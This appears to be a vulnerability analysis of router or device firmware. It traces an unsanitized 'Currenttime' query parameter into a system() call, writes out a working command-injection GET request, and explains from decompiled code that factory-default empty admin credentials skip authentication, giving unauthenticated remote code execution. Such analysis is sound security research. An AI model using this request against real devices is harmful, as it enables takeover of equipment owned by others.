=== Vulnerability Analysis ===

Root Cause: websGetVar("Currenttime") returns user-supplied HTTP query parameter
with no sanitization. This value is formatted directly into a shell command string
via sprintf("date -s %s &", Currenttime), then passed to doSystem() which calls system().

Attack Vector: GET /home.htm?Currenttime=2027-09-22;id>/tmp/pwned_v1
  → system("date -s 2027-09-22;id>/tmp/pwned_v1 &")
  → shell splits on ';': executes "date -s 2027-09-22" then "id>/tmp/pwned_v1"

Auth Bypass (websCheckRealm @ 0x414e3c):
  Decompiled logic:
    v2 = nvram_bufget(0, "AdminID");      // stored admin ID
    v4 = nvram_bufget(0, "AdminPassword"); // stored admin password
    if (!*v2 && !*v4) {                   // if BOTH empty
        a1[44] = 3;                       // grant auth level 3 (admin)
        goto LABEL_4;                     // skip authentication
    }

  When AdminID and AdminPassword are empty (factory default state),
  the function grants admin-level access (level 3) without any credentials.
  This makes V1 an UNAUTHENTICATED RCE on devices with default configuration.

Patches for QEMU verification:
  The 3 NOP patches bypass the year/month/day comparison that requires
  getSysInfoBuffer(4) to return a valid stored date from /dev/gpio hardware.
  QEMU user-mode cannot emulate /dev/gpio, so the comparison always fails.
  On real hardware, these patches are NOT needed — /dev/gpio works normally.
